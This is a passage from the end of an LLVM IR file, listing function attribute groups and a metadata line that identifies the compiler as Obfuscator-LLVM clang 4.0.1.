attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
